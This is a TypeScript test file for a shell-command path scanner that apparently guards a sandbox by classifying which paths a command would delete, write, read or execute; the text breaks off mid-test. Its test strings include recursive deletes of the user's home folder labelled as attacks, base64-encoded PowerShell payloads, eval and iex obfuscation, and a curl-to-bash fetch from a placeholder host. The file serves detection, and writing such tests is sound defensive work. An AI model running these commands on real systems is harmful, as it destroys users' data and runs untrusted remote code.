/**
 * shellPaths.ts (F242, layer 2): the paths a shell command or an argv names. Pure: every case runs on
 * an injected home map, with literal Windows paths under platform win32 and posix paths under posix,
 * so the Windows-spelled attacks are proved on Linux too. Nothing here touches a disk.
 */
import { describe, expect, it } from 'vitest'
import { scanArgv, scanShellText, type HomeMap, type ShellPath, type ShellScan } from '../../tools/shellPaths.js'

const W: HomeMap = {
  home: 'C:\\Users\\u',
  appData: 'C:\\Users\\u\\AppData\\Roaming',
  localAppData: 'C:\\Users\\u\\AppData\\Local',
  temp: 'C:\\cynco-sandbox\\run1\\tmp',
  scratch: 'C:\\cynco-sandbox\\run1\\scratch',
  user: 'u',
}
const BASE = 'C:\\Users\\u\\proj'
const X: HomeMap = { home: '/home/u', appData: '/home/u/AppData/Roaming', localAppData: '/home/u/AppData/Local', temp: '/sb/run1/tmp', scratch: '/sb/run1/scratch', user: 'u' }
const XBASE = '/work/proj'

const scan = (cmd: string, homes: HomeMap = W, base = BASE): ShellScan => scanShellText(cmd, base, homes, { platform: homes === W ? 'win32' : 'posix' })
// The folder a program is started in (`startedIn`, review 2026-11-23, fourth) has its own tests; the operand
// tables below read the operands only.
const ofOp = (s: ShellScan, ...ops: string[]): ShellPath[] => s.paths.filter(p => ops.includes(p.op) && !p.startedIn)
const pathsOf = (s: ShellScan, ...ops: string[]): string[] => ofOp(s, ...ops).map(p => p.path as string)
const lower = (xs: string[]) => xs.map(x => x.toLowerCase())

describe('home spellings resolve to the injected home (win32)', () => {
  const spellings = [
    '$HOME', '${HOME}', '$env:USERPROFILE', '${env:USERPROFILE}', '$Env:UserProfile', '%USERPROFILE%', '!USERPROFILE!',
    '$env:HOMEDRIVE$env:HOMEPATH', '%HOMEDRIVE%%HOMEPATH%', '~', '(Resolve-Path ~)',
    "[Environment]::GetFolderPath('UserProfile')", '[System.Environment]::GetFolderPath("UserProfile")',
    'Path.home()', 'pathlib.Path.home()', "os.path.expanduser('~')", "os.environ['USERPROFILE']",
    'os.environ.get("HOME")', "os.getenv('USERPROFILE')", 'os.homedir()', "require('os').homedir()",
    "require('os').userInfo().homedir", 'process.env.USERPROFILE', 'C:\\Users\\$env:USERNAME', 'C:\\Users\\%USERNAME%',
  ]
  for (const sp of spellings) {
    it(`Remove-Item -Recurse ${sp}\\.x`, () => {
      const s = scan(`Remove-Item -Recurse ${sp}\\.x`)
      expect(lower(pathsOf(s, 'delete'))).toContain('c:\\users\\u\\.x')
      expect(s.unresolvedMutation).toBeNull()
    })
  }
  it('expanduser("~/.x") is the home plus the tail', () => {
    expect(pathsOf(scan('Remove-Item -Recurse expanduser("~/.x")'), 'delete')).toEqual(['C:\\Users\\u\\.x'])
  })
  it('in the posix dialect too', () => {
    expect(pathsOf(scan('rm -rf $HOME/.x', X, XBASE), 'delete')).toEqual(['/home/u/.x'])
  })
})

describe('APPDATA, TEMP and CYNCO_SCRATCH spellings', () => {
  it('APPDATA and LOCALAPPDATA resolve to the injected folders', () => {
    expect(pathsOf(scan('Remove-Item $env:APPDATA\\x'), 'delete')).toEqual(['C:\\Users\\u\\AppData\\Roaming\\x'])
    expect(pathsOf(scan('Remove-Item %LOCALAPPDATA%\\x'), 'delete')).toEqual(['C:\\Users\\u\\AppData\\Local\\x'])
  })
  for (const sp of ['$env:TEMP', '%TMP%', '[IO.Path]::GetTempPath()', 'tempfile.gettempdir()', 'os.tmpdir()']) {
    it(`${sp} is the injected temp`, () => {
      expect(pathsOf(scan(`Remove-Item ${sp}\\x`), 'delete')).toEqual(['C:\\cynco-sandbox\\run1\\tmp\\x'])
    })
  }
  for (const sp of ['$env:CYNCO_SCRATCH', '%CYNCO_SCRATCH%', '$CYNCO_SCRATCH', "os.environ['CYNCO_SCRATCH']", 'process.env.CYNCO_SCRATCH']) {
    it(`${sp} is the injected scratch, and unreadable when there is none`, () => {
      expect(pathsOf(scan(`Remove-Item ${sp}\\x`), 'delete')).toEqual(['C:\\cynco-sandbox\\run1\\scratch\\x'])
      const none = scan(`Remove-Item ${sp}\\x`, { ...W, scratch: null })
      expect(pathsOf(none, 'delete')).toEqual([])
      expect(none.unresolvedMutation?.op).toBe('delete')
    })
  }
})

describe('absolute forms', () => {
  it('drive, quoted, UNC, device and provider spellings', () => {
    expect(pathsOf(scan('Remove-Item C:\\a\\b'), 'delete')).toEqual(['C:\\a\\b'])
    expect(pathsOf(scan('Remove-Item C:/a/b'), 'delete')).toEqual(['C:\\a\\b'])
    expect(pathsOf(scan('Remove-Item "C:\\a b\\c"'), 'delete')).toEqual(['C:\\a b\\c'])
    expect(pathsOf(scan('Remove-Item \\\\server\\share\\x'), 'delete')).toEqual(['\\\\server\\share\\x'])
    expect(pathsOf(scan('Remove-Item \\\\?\\C:\\a'), 'delete')).toEqual(['C:\\a'])
    expect(pathsOf(scan('Remove-Item \\\\?\\UNC\\s\\sh\\x'), 'delete')).toEqual(['\\\\s\\sh\\x'])
    const dev = scan('Remove-Item \\\\.\\PhysicalDrive0')
    expect(ofOp(dev, 'delete')[0].device).toBe(true)
    expect(pathsOf(scan('Remove-Item file:///C:/a'), 'delete')).toEqual(['C:\\a'])
    expect(pathsOf(scan('Remove-Item FileSystem::C:\\a'), 'delete')).toEqual(['C:\\a'])
  })
  it('the msys form needs a segment after the drive letter; a bare /c is not a drive', () => {
    expect(pathsOf(scan('rm -rf /c/Users/x'), 'delete')).toEqual(['C:\\Users\\x'])
    expect(pathsOf(scan('rm -rf /c'), 'delete')).toEqual(['C:\\c'])
  })
  it('posix: a backslash tail joins a posix anchor, and a drive word is kept as written', () => {
    expect(pathsOf(scan('Remove-Item $env:USERPROFILE\\.x', X, XBASE), 'delete')).toEqual(['/home/u/.x'])
    expect(pathsOf(scan('Remove-Item C:\\a', X, XBASE), 'delete')).toEqual(['C:\\a'])
  })
})

describe('parent traversal and cd tracking', () => {
  it('resolves against the base and follows cd', () => {
    expect(pathsOf(scan('Remove-Item ..\\..\\.cynco -Recurse'), 'delete')).toEqual(['C:\\Users\\.cynco'])
    expect(pathsOf(scan('cd ..; rm -rf other'), 'delete')).toEqual(['C:\\Users\\u\\other'])
    expect(pathsOf(scan('Set-Location $env:USERPROFILE; Remove-Item .cynco -Recurse'), 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
  })
  it('an unreadable cd makes later relative write-class operands unreadable', () => {
    const s = scan('cd $d; Remove-Item x -Recurse')
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
  })
})

describe('wildcards and the quoted-prefix split', () => {
  it('rm -rf ~/.*/ is the home with children', () => {
    const [p] = ofOp(scan('rm -rf ~/.*/'), 'delete')
    expect(p.path).toBe('C:\\Users\\u')
    expect(p.children).toBe(true)
    expect(p.recursive).toBe(true)
  })
  it('Remove-Item .\\build\\* is base\\build with children', () => {
    const [p] = ofOp(scan('Remove-Item .\\build\\*'), 'delete')
    expect(p.path).toBe('C:\\Users\\u\\proj\\build')
    expect(p.children).toBe(true)
  })
  it('"$HOME"/.cynco yields the home and home/.cynco; $env:USERPROFILE\'\\.x\' yields one path', () => {
    expect(pathsOf(scan('rm -rf "$HOME"/.cynco'), 'delete')).toEqual(['C:\\Users\\u', 'C:\\Users\\u\\.cynco'])
    expect(pathsOf(scan("Remove-Item $env:USERPROFILE'\\.x'"), 'delete')).toEqual(['C:\\Users\\u\\.x'])
  })
})

describe('pipeline inheritance', () => {
  it('attack 4: one inherited recursive delete on the home', () => {
    const s = scan('Get-ChildItem $env:USERPROFILE -Force -Directory -Filter .* | Remove-Item -Recurse -Force')
    const d = ofOp(s, 'delete')
    expect(d.map(p => p.path)).toEqual(['C:\\Users\\u'])
    expect(d[0].inherited).toBe(true)
    expect(d[0].recursive).toBe(true)
  })
  it('find | xargs rm -rf inherits the same way', () => {
    const d = ofOp(scan("find ~ -name '.*' | xargs rm -rf"), 'delete')
    expect(d.map(p => [p.path, p.inherited])).toEqual([['C:\\Users\\u', true]])
  })
  it('a mention is inherited by a mutating verb, and an Out-File with its own target inherits nothing', () => {
    expect(pathsOf(scan('Write-Output ~\\.cynco | Remove-Item -Recurse'), 'delete')).toEqual(['C:\\Users\\u\\.cynco'])
    const s = scan('Get-ChildItem ~ | Out-File dots.txt')
    expect(pathsOf(s, 'list')).toEqual(['C:\\Users\\u'])
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\dots.txt'])
    expect(pathsOf(s, 'delete')).toEqual([])
  })
  it('a ForEach-Object block takes $_ from the pipeline around it', () => {
    expect(pathsOf(scan('Get-ChildItem ~ -Force | ForEach-Object { Remove-Item $_.FullName -Recurse }'), 'delete')).toEqual(['C:\\Users\\u'])
  })
})

describe('grouped expressions', () => {
  it('a value group handed to a path verb is its operand, joined with +', () => {
    expect(pathsOf(scan("Remove-Item -Recurse ([Environment]::GetFolderPath('UserProfile') + '\\.x')"), 'delete')).toEqual(['C:\\Users\\u\\.x'])
    expect(pathsOf(scan('Remove-Item -Recurse ($env:USERPROFILE)'), 'delete')).toEqual(['C:\\Users\\u'])
  })
  it('a command group is a subexpression: unresolved, with its own paths read', () => {
    const s = scan("Remove-Item (Get-Content $env:USERPROFILE\\list.txt) -Recurse")
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    expect(pathsOf(s, 'read')).toContain('C:\\Users\\u\\list.txt')
    // `Join-Path` over two words is read as the path it makes (review 2026-11-23, fourth).
    expect(pathsOf(scan("Remove-Item (Join-Path $env:USERPROFILE 'x') -Recurse"), 'delete')).toEqual(['C:\\Users\\u\\x'])
  })
  it('inside an inline program a call argument is not an operand of the call before it', () => {
    const s = scan(`python -c "import os; open('out/x.txt','w').write(os.path.expanduser('~'))"`)
    expect(ofOp(s, 'unclassified')).toEqual([])
  })
})

describe('cmd payloads', () => {
  it('attack 5', () => {
    const s = scan('cmd /c rd /s /q %USERPROFILE%\\.cynco')
    const d = ofOp(s, 'delete')
    expect(d.map(p => p.path)).toEqual(['C:\\Users\\u\\.cynco'])
    expect(d[0].recursive).toBe(true)
    expect(d[0].via).toBe('shell>cmd /c')
    expect(s.texts.length).toBeGreaterThan(1)
  })
  it('two deletes in one quoted payload', () => {
    expect(pathsOf(scan('cmd /c "del /q C:\\a\\b.txt & rd /s /q C:\\a"'), 'delete')).toEqual(['C:\\a\\b.txt', 'C:\\a'])
  })
  it('mklink /J gives a link with its target', () => {
    const [l] = ofOp(scan('cmd /c mklink /J link C:\\Users\\x'), 'link')
    expect(l.path).toBe('C:\\Users\\u\\proj\\link')
    expect(l.linkTarget).toBe('C:\\Users\\x')
  })
})

describe('constant propagation (2.M1)', () => {
  it('PowerShell, POSIX, Python and JavaScript bindings name a direct target', () => {
    const ps = scan("$t = 'D:\\Video'; Remove-Item $t -Recurse")
    expect(pathsOf(ps, 'delete')).toEqual(['D:\\Video'])
    expect(ps.unresolvedMutation).toBeNull()
    expect(pathsOf(scan('d=/data/x; rm -rf "$d"', X, XBASE), 'delete')).toEqual(['/data/x'])
    expect(pathsOf(scan(`python -c "p = r'D:\\x'; import shutil; shutil.rmtree(p)"`), 'delete')).toContain('D:\\x')
    expect(pathsOf(scan(`node -e "const p = 'D:/x'; require('fs').rmSync(p, { recursive: true })"`), 'delete')).toContain('D:\\x')
  })
  it('a name assigned twice or from a call is unreadable', () => {
    const twice = scan("$t = 'C:\\a'; $t = 'C:\\b'; Remove-Item $t")
    expect(pathsOf(twice, 'delete')).toEqual([])
    expect(twice.unresolvedMutation?.op).toBe('delete')
    const call = scan('$t = Get-Content x; Remove-Item $t')
    expect(pathsOf(call, 'delete')).toEqual([])
    expect(call.unresolvedMutation?.op).toBe('delete')
    // An item source bound to a name is the item (review 2026-11-23, fourth).
    expect(pathsOf(scan('$t = Get-Item x; Remove-Item $t'), 'delete')).toEqual(['C:\\Users\\u\\proj\\x'])
  })
  it('an assignment to an anchor name rebinds it', () => {
    const [p] = ofOp(scan("$env:TEMP = 'C:\\x'; Remove-Item $env:TEMP\\* -Recurse"), 'delete')
    expect(p.path).toBe('C:\\x')
    expect(p.children).toBe(true)
  })
  it('every right-hand side is also a mention', () => {
    expect(pathsOf(scan("$t = 'D:\\Video'"), 'mention')).toEqual(['D:\\Video'])
  })
})

describe('the whole-argument rule (2.M1)', () => {
  it('a literal is direct; a method or attribute after it is unresolved', () => {
    const lit = scan(`python -c "import shutil; shutil.rmtree('build')"`)
    expect(pathsOf(lit, 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    expect(lit.unresolvedMutation).toBeNull()
    const exp = scan(`python -c "import shutil; from pathlib import Path; shutil.rmtree(Path('~/.cynco').expanduser())"`)
    expect(pathsOf(exp, 'delete')).toEqual([])
    expect(exp.unresolvedMutation?.op).toBe('delete')
    expect(pathsOf(exp, 'mention')).toContain('C:\\Users\\u\\.cynco')
    const par = scan(`python -c "import shutil; from pathlib import Path; shutil.rmtree(Path('.').resolve().parent / '.cynco')"`)
    expect(par.unresolvedMutation?.op).toBe('delete')
    expect(par.parentClimb).toBeGreaterThanOrEqual(1)
  })
  it('os.path.dirname(os.getcwd()) counts one climb', () => {
    const s = scan(`python -c "import os, shutil; shutil.rmtree(os.path.dirname(os.getcwd()))"`)
    expect(s.unresolvedMutation?.op).toBe('delete')
    expect(s.parentClimb).toBe(1)
  })
})

describe('inline code', () => {
  it('open(..., "w") is a direct write and no unresolved mutation', () => {
    const s = scan(`python -c "open('out/x.txt','w')"`)
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\out\\x.txt'])
    expect(s.unresolvedMutation).toBeNull()
  })
  it('shutil.copy reads the source and writes the destination; raw strings are unescaped', () => {
    const s = scan(`python -c "import shutil; shutil.copy(r'C:\\a\\b', 'c')"`)
    expect(pathsOf(s, 'read')).toContain('C:\\a\\b')
    expect(pathsOf(s, 'write')).toEqual(['C:\\Users\\u\\proj\\c'])
  })
  it('doubled backslashes are unescaped', () => {
    expect(pathsOf(scan(`python -c "import os; os.remove('C:\\\\a\\\\b')"`), 'delete')).toEqual(['C:\\a\\b'])
  })
  it('a concatenation is an unresolved delete and a home mention', () => {
    const s = scan(`node -e "require('fs').rmSync(require('os').homedir()+'/.x',{recursive:true})"`)
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: expect.any(String), recursive: true })
    expect(pathsOf(s, 'mention')).toContain('C:\\Users\\u')
  })
})

describe('here-documents and here-strings by consumer (2.M2)', () => {
  const body = "from pathlib import Path\np = Path.home() / '.civkings'\nopen(p, 'w')\nimport shutil\nshutil.rmtree(p2)"
  it('a body fed to an interpreter is code', () => {
    for (const cmd of [`@'\n${body}\n'@ | python -`, `python - <<'EOF'\n${body}\nEOF`]) {
      const s = scan(cmd)
      expect(s.texts).toContain(body)
      expect(s.unresolvedMutation?.op).toBe('delete')
      expect(pathsOf(s, 'mention')).toContain('C:\\Users\\u')
    }
  })
  it('the same body written to a file is data', () => {
    for (const cmd of [`@'\n${body}\n'@ | Set-Content src\\save.py`, `cat > x.py <<'EOF'\n${body}\nEOF`]) {
      const s = scan(cmd)
      expect(s.texts).toContain(body)
      expect(s.unresolvedMutation).toBeNull()
      expect(ofOp(s, 'mention')).toEqual([])
      expect(s.selfBuilding).toBeNull()
      expect(ofOp(s, 'write').length).toBe(1)
    }
  })
  it('a here-string bound to a name and passed to python -c is code; a computed name is self-building', () => {
    const s = scan(`$code = @'\n${body}\n'@\npython -c $code`)
    expect(s.unresolvedMutation?.op).toBe('delete')
    expect(scan('$x = Get-Thing; python -c $x').selfBuilding).toBe('an inline program passed through a variable that cannot be read')
  })
})

describe('names nothing', () => {
  it('echo, Write-Host, Write-Output and printf operands are mentions; a redirect after them is a write', () => {
    for (const v of ['echo', 'Write-Host', 'Write-Output', 'printf']) {
      const s = scan(`${v} C:\\Users\\u\\.cache`)
      expect(pathsOf(s, 'mention')).toEqual(['C:\\Users\\u\\.cache'])
      expect(ofOp(s, 'write', 'delete', 'unclassified')).toEqual([])
    }
    expect(pathsOf(scan('echo x > out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
  })
})

describe('-EncodedCommand', () => {
  const attack4 = 'Get-ChildItem $env:USERPROFILE -Force -Directory -Filter .* | Remove-Item -Recurse -Force'
  const b64 = Buffer.from(attack4, 'utf16le').toString('base64')
  for (const flag of ['-e', '-ec', '-en', '-enc', '-enco', '-EncodedCommand', '-encodedc']) {
    it(`powershell ${flag} decodes into texts and yields the inherited delete`, () => {
      const s = scan(`powershell -NoProfile ${flag} ${b64}`)
      expect(s.texts).toContain(attack4)
      expect(ofOp(s, 'delete').map(p => [p.path, p.inherited])).toEqual([['C:\\Users\\u', true]])
    })
  }
  it('a base64 word that is not text is self-building', () => {
    const junk = Buffer.from([0x00, 0xd8, 0x01, 0x00, 0x02, 0x00, 0x00, 0xdc]).toString('base64')
    expect(scan(`powershell -enc ${junk}`).selfBuilding).toBe('an -EncodedCommand that does not decode to text')
  })
})

describe('self-building markers', () => {
  for (const cmd of ['Invoke-Expression $x', 'iex $x', '[Convert]::FromBase64String($s)', '[scriptblock]::Create($s)',
    'eval "$x"', 'echo aGk= | base64 -d | sh', "&('Rem'+'ove-Item') x",
    `python -c "import base64; exec(base64.b64decode('cHJpbnQoMSk='))"`, `node -e "eval(atob('MQ=='))"`]) {
    it(cmd, () => { expect(scan(cmd).selfBuilding).not.toBeNull() })
  }
  it('a plain eval in python does not', () => {
    expect(scan(`python -c "print(eval('1+1'))"`).selfBuilding).toBeNull()
  })
})

describe('copy, move and redirects', () => {
  it('copy and move operands', () => {
    const cp = scan('Copy-Item C:\\lib\\x.py .\\vendor\\x.py')
    expect(pathsOf(cp, 'read')).toEqual(['C:\\lib\\x.py'])
    expect(pathsOf(cp, 'write')).toEqual(['C:\\Users\\u\\proj\\vendor\\x.py'])
    const mv = scan('Move-Item a.txt C:\\other\\b.txt')
    expect(pathsOf(mv, 'move')).toEqual(['C:\\Users\\u\\proj\\a.txt'])
    expect(pathsOf(mv, 'write')).toEqual(['C:\\other\\b.txt'])
  })
  it('robocopy /MIR makes the destination delete-class', () => {
    const s = scan('robocopy src dst /MIR')
    expect(pathsOf(s, 'delete')).toEqual(['C:\\Users\\u\\proj\\dst'])
    expect(pathsOf(s, 'read')).toEqual(['C:\\Users\\u\\proj\\src'])
  })
  it('redirect targets are writes, the null devices are nothing', () => {
    expect(pathsOf(scan('python x > out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
    expect(pathsOf(scan('python x >> out.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\out.txt'])
    expect(pathsOf(scan('python x 2> err.txt'), 'write')).toEqual(['C:\\Users\\u\\proj\\err.txt'])
    for (const cmd of ['python x > $null', 'python x > NUL', 'python x >/dev/null', 'python x 2>&1']) expect(ofOp(scan(cmd), 'write')).toEqual([])
  })
})

describe('program position', () => {
  it('an .exe or extensionless program is not a target', () => {
    for (const cmd of ['& "C:\\Users\\x\\.bun\\bin\\bun.exe" test', 'C:\\Py\\python.exe -m pytest', 'Start-Process C:\\Py\\python.exe -ArgumentList x']) {
      expect(scan(cmd).paths.filter(p => !p.startedIn)).toEqual([])
    }
  })
  it('a script is an exec target; -m names nothing', () => {
    expect(pathsOf(scan('python C:\\a\\tool.py'), 'exec')).toEqual(['C:\\a\\tool.py'])
    expect(pathsOf(scan('.\\run.ps1'), 'exec')).toEqual(['C:\\Users\\u\\proj\\run.ps1'])
    expect(scan('python -m pytest tests/').paths.filter(p => !p.startedIn)).toEqual([])
  })
})

describe('git through scanShellText', () => {
  it('-C and the write targets', () => {
    expect(pathsOf(scan('git -C C:\\other commit -m x'), 'write')).toEqual(['C:\\other'])
    expect(pathsOf(scan('git -C C:\\other log'), 'write')).toEqual(['C:\\other'])
    expect(pathsOf(scan('git worktree add ..\\wt'), 'write')).toEqual(['C:\\Users\\u\\wt'])
    expect(pathsOf(scan('git init C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git clone . C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git format-patch -o C:\\x'), 'write')).toEqual(['C:\\x'])
    expect(pathsOf(scan('git apply C:\\tmp\\p.patch'), 'read')).toEqual(['C:\\tmp\\p.patch'])
    expect(scan('git commit -m "fix ~/.cynco handling"').paths.filter(p => !p.startedIn)).toEqual([])
    expect(scan('git commit -am "~/.cache cleanup"').paths.filter(p => !p.startedIn)).toEqual([])
  })
  it('destructive subcommands set gitDestructive and name their path operands', () => {
    const cases: Array<[string, string[]]> = [
      ['git checkout -- a.py', ['C:\\Users\\u\\proj\\a.py']],
      ['git restore a.py', ['C:\\Users\\u\\proj\\a.py']],
      ['git rm -r old', ['C:\\Users\\u\\proj\\old']],
      ['git clean -fdx', ['C:\\Users\\u\\proj']],
      ['git stash drop', []],
      ['git stash pop', []],
      ['git reset --hard HEAD~1', []],
      ['git worktree remove ..\\wt', ['C:\\Users\\u\\wt']],
    ]
    for (const [cmd, paths] of cases) {
      const s = scan(cmd)
      expect(s.gitDestructive, cmd).toBe(true)
      expect(pathsOf(s, 'write', 'delete'), cmd).toEqual(paths)
    }
    for (const cmd of ['git stash list', 'git checkout -b x', 'git clean -n']) expect(scan(cmd).gitDestructive, cmd).toBe(false)
  })
  it('git config writes of a setting', () => {
    expect(scan('git config core.fsmonitor "x"').gitConfigWrite).toBe('core.fsmonitor')
    expect(scan('git config --global core.pager x').gitConfigWrite).toBe('core.pager')
    expect(scan('git config --system user.name x').gitConfigWrite).toBe('user.name')
    for (const cmd of ['git config user.name x', 'git config --get core.pager', 'git config -l']) expect(scan(cmd).gitConfigWrite, cmd).toBeNull()
  })
})

describe('scanArgv (2.M3)', () => {
  const argv = (words: string[]) => scanArgv(words, BASE, W, { platform: 'win32' })
  it('no comment handling, no message candidates, no expansion', () => {
    expect(pathsOf(argv(['git', 'diff', 'HEAD', '#', '--output=C:\\out\\x']), 'write')).toEqual(['C:\\out\\x'])
    expect(argv(['git', 'commit', '-m', 'fix # of ~/.cynco']).paths).toEqual([])
    expect(pathsOf(argv(['git', '--work-tree=$HOME', 'status']), 'write')).toEqual(['C:\\Users\\u\\proj\\$HOME'])
    expect(argv(['git', 'commit', '-m', 'git checkout -- x']).gitDestructive).toBe(false)
    expect(argv(['git', 'commit', '-m', 'x']).texts).toEqual([])
  })
})

describe('unclassified operands', () => {
  it('a home dot-folder handed to an unknown program', () => {
    expect(pathsOf(scan('sometool --out $env:USERPROFILE\\.x'), 'unclassified')).toEqual(['C:\\Users\\u\\.x'])
  })
  it('a script and its argument', () => {
    const s = scan('python scripts/scan.py C:\\lib\\site-packages')
    expect(pathsOf(s, 'exec')).toEqual(['C:\\Users\\u\\proj\\scripts\\scan.py'])
    expect(pathsOf(s, 'unclassified')).toEqual(['C:\\lib\\site-packages'])
  })
})

describe('limits', () => {
  it('a text over 1 MiB and a payload nested five deep are faults, not throws', () => {
    expect(scan('x'.repeat(1.1 * 1024 * 1024)).faults.length).toBeGreaterThan(0)
    const nested = 'powershell -Command '.repeat(6) + 'Remove-Item C:\\a'
    expect(scan(nested).faults.some(f => /nested deeper/.test(f))).toBe(true)
  })
  it('513 paths set truncated; with Remove-Item, sawWrite', () => {
    const list = Array.from({ length: 513 }, (_, i) => `C:\\a\\${i}`).join(' ')
    const read = scan(`Get-Content ${list}`)
    expect(read.truncated).toBe('more than 512 paths in one command')
    expect(read.paths.length).toBe(512)
    expect(read.sawWrite).toBe(false)
    expect(scan(`Remove-Item ${list}`).sawWrite).toBe(true)
  })
  it('never throws on garbage', () => {
    for (const g of ['"unbalanced', "'also", "@'", 'powershell -enc QQ', '', '((((', '$(', '<<EOF', '`', '^']) {
      expect(() => scan(g)).not.toThrow()
      expect(() => scanArgv([g], BASE, W)).not.toThrow()
    }
  })
})

describe('the review of 2026-11-23', () => {
  it('a bare drive word is that drive read lexically, never the process folder', () => {
    expect(pathsOf(scan('Remove-Item D: -Recurse'), 'delete')).toEqual(['D:\\'])
    expect(pathsOf(scan('Remove-Item D:Video -Recurse'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('Remove-Item C: -Recurse'), 'delete')).toEqual([BASE])
    expect(pathsOf(scan('Set-Location D:; Remove-Item Video'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('D:; Remove-Item Video'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('C:; Remove-Item Video'), 'delete')).toEqual([`${BASE}\\Video`])
    expect(pathsOf(scan('cmd /c "cd /d D:\\ && rd /s /q Video"'), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('cmd /c "cd /d src && del *.pyc"'), 'cd')).toEqual([`${BASE}\\src`])
  })
  it('powershell parameters written with a slash are read as with a dash', () => {
    for (const flag of ['/c', '/C', '/Command', '/command']) {
      expect(pathsOf(scan(`powershell ${flag} "Remove-Item D:\\x"`), 'delete'), flag).toEqual(['D:\\x'])
    }
    const b64 = Buffer.from('Remove-Item D:\\x', 'utf16le').toString('base64')
    for (const flag of ['/EncodedCommand', '/enc', '/e', '/ec']) {
      const s = scan(`powershell ${flag} ${b64}`)
      expect(pathsOf(s, 'delete'), flag).toEqual(['D:\\x'])
      expect(s.texts).toContain('Remove-Item D:\\x')
    }
    expect(pathsOf(scan('powershell /File C:\\a\\run.ps1'), 'exec')).toEqual(['C:\\a\\run.ps1'])
  })
  it('a program fed on standard input is scanned when it is written there, and self-building when not', () => {
    expect(pathsOf(scan('echo Remove-Item D:\\x | powershell -'), 'delete')).toEqual(['D:\\x'])
    expect(pathsOf(scan("'Remove-Item D:\\x' | powershell -Command -"), 'delete')).toEqual(['D:\\x'])
    expect(pathsOf(scan("echo \"import shutil; shutil.rmtree('D:/x')\" | python -"), 'delete')).toEqual(['D:\\x'])
    expect(scan('Get-Content x.ps1 | powershell').selfBuilding).toMatch(/standard input/)
    expect(scan('curl -s https://example.invalid/x.sh | bash').selfBuilding).toMatch(/standard input/)
    expect(scan('echo y | python -m pytest').selfBuilding).toBeNull()
    expect(scan('Get-Content data.txt | python tool.py').selfBuilding).toBeNull()
  })
  it('a parameter followed by a group takes the group, never the next parameter', () => {
    const s = scan("Remove-Item -Path (Resolve-Path 'D:\\Video' | Split-Path) -Recurse")
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    expect(pathsOf(s, 'read')).toContain('D:\\Video')
    expect(pathsOf(scan("Remove-Item -Path (Join-Path 'D:\\' 'Video') -Recurse"), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan('Remove-Item -Path -Recurse'), 'delete')).toEqual([])
    expect(pathsOf(scan('Remove-Item -Path build -Recurse'), 'delete')).toEqual([`${BASE}\\build`])
  })
  it('a value at the head of a pipeline flows down it', () => {
    expect(pathsOf(scan("'D:\\a','D:\\b' | Remove-Item"), 'delete')).toEqual(['D:\\a', 'D:\\b'])
    expect(pathsOf(scan("@('D:\\a') | Remove-Item"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan('$env:USERPROFILE | Remove-Item'), 'delete')).toEqual(['C:\\Users\\u'])
    expect(pathsOf(scan('Get-ChildItem D:\\a | % Delete'), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan('Get-ChildItem D:\\a | % MoveTo C:\\b'), 'move')).toEqual(['D:\\a'])
    // A content reader sends lines, not the file: the target cannot be read.
    const c = scan('Get-Content list.txt | Remove-Item')
    expect(pathsOf(c, 'delete')).toEqual([])
    expect(c.unresolvedMutation?.op).toBe('delete')
  })
  it("cmd's for loop: the list is a mention, the body is a command read once per element of a literal list", () => {
    const s = scan('for /d %d in (%USERPROFILE%\\.*, D:\\x) do @rd /s /q "%d"')
    expect(lower(pathsOf(s, 'mention'))).toEqual(expect.arrayContaining(['c:\\users\\u', 'd:\\x']))
    // Each element of a literal list is the variable (review 2026-11-23, fourth).
    expect(lower(pathsOf(s, 'delete'))).toEqual(expect.arrayContaining(['c:\\users\\u', 'd:\\x']))
    expect(pathsOf(scan('for /r C:\\src %f in (*.pyc) do del %f'), 'mention')).toContain('C:\\src')
    expect(pathsOf(scan('for %f in (a b) do del %f'), 'delete')).toEqual(['C:\\Users\\u\\proj\\a', 'C:\\Users\\u\\proj\\b'])
    // A modifier, /r and a list that cannot be read keep the variable unread.
    expect(scan('for /r C:\\src %f in (*.pyc) do del %f').unresolvedMutation?.op).toBe('delete')
    expect(scan('for %f in (%NOPE%) do del %f').unresolvedMutation?.op).toBe('delete')
    expect(scan('for %f in (a) do del %~dpf').unresolvedMutation?.op).toBe('delete')
    // a POSIX for is not cmd's
    expect(pathsOf(scan('for d in ~/.*/; do rm -rf "$d"; done', X, XBASE), 'unclassified')).toContain('/home/u')
  })
  it('%X% with a one-letter name and a cmd set binding', () => {
    // cmd expands %X% when it reads the line, before a `set X=` on that line has run (measured, review
    // 2026-11-23, third): the delete is through a name the scan cannot read, and the value stays beside it.
    const same = scan('cmd /c "set X=D:\\v && rd /s /q %X%"')
    expect(pathsOf(same, 'delete')).toEqual([])
    expect(same.unresolvedMutation).toEqual({ op: 'delete', verb: 'rd', recursive: true })
    expect(pathsOf(same, 'unclassified')).toEqual(['D:\\v'])
    // A PowerShell assignment has run before cmd starts: cmd sees its value.
    expect(pathsOf(scan("$env:X='D:\\v'; cmd /c rd /s /q %X%"), 'delete')).toEqual(['D:\\v'])
  })
  it('the Windows folder variables are anchored to the real home', () => {
    expect(pathsOf(scan('Remove-Item $env:OneDrive\\Desktop'), 'delete')).toEqual(['C:\\Users\\u\\OneDrive\\Desktop'])
